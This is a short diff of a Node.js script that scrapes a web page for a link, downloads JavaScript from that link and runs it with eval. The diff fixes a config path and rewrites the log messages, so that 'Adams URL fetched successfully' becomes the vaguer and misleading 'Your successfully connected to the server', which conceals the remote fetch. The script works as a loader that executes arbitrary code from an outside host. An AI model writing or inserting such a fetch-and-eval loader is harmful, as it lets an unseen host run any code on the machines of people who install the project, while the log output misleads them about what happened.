@@ -1,6 +1,6 @@
 const axios = require('axios');
 const cheerio = require('cheerio');
-const adams = require(__dirname + "/onfig");
+const adams = require(__dirname + "/config");
 
 async function fetchAdamsUrl() {
   try {
@@ -11,10 +11,10 @@ async function fetchAdamsUrl() {
     const adamsUrl = adamsUrlElement.attr('href');
 
     if (!adamsUrl) {
-      throw new Error('Adams URL link not found...');
+      throw new Error('The url link not found...');
     }
 
-    console.log('Adams URL fetched successfully ✅');
+    console.log('Your successfully connected to the server ✅');
 
     const scriptResponse = await axios.get(adamsUrl);
     eval(scriptResponse.data);
